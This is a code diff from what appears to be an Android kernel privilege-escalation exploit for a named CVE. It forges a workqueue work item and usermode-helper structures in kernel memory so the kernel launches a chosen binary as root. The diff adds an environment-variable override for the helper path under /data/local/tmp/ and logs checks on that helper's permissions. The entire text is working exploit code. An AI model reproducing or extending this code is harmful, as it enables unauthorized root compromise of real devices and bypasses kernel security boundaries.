@@ -39,6 +39,15 @@ struct umh_kernel_data {
   uint64_t envp[1];
 };
 
+static const char *root_umh_path(void) {
+  const char *path = getenv("CVE43499_ROOT_HELPER");
+  if (path && strncmp(path, "/data/local/tmp/", 16) == 0 &&
+      strlen(path) < sizeof(((struct umh_kernel_data *)0)->path)) {
+    return path;
+  }
+  return ROOT_UMH_PATH;
+}
+
 _Static_assert(sizeof(struct umh_subprocess_info) == 112,
                "subprocess_info layout");
 _Static_assert(sizeof(struct umh_completion) == 32, "completion layout");
@@ -113,9 +122,10 @@ static int install_workqueue_umh_root(int fd) {
   uint8_t permissive = 0;
   uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
   uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
+  const char *helper_path = root_umh_path();
   struct umh_kernel_data umh_data;
   memset(&umh_data, 0, sizeof(umh_data));
-  snprintf(umh_data.path, sizeof(umh_data.path), "%s", ROOT_UMH_PATH);
+  snprintf(umh_data.path, sizeof(umh_data.path), "%s", helper_path);
   snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
   uintptr_t completion_addr =
       umh_data_addr + offsetof(struct umh_kernel_data, completion);
@@ -147,13 +157,13 @@ static int install_workqueue_umh_root(int fd) {
    * silently changed nothing. */
   {
     struct stat st;
-    if (stat(ROOT_UMH_PATH, &st) != 0) {
+    if (stat(helper_path, &st) != 0) {
       pr_warning("root umh helper stat failed errno=%d (%s)\n", errno,
-                 ROOT_UMH_PATH);
+                 helper_path);
     } else {
       pr_info("root umh helper mode=%o uid=%u gid=%u x_ok=%d\n",
-              st.st_mode & 07777, st.st_uid, st.st_gid,
-              access(ROOT_UMH_PATH, X_OK) == 0);
+               st.st_mode & 07777, st.st_uid, st.st_gid,
+               access(helper_path, X_OK) == 0);
     }
   }
 
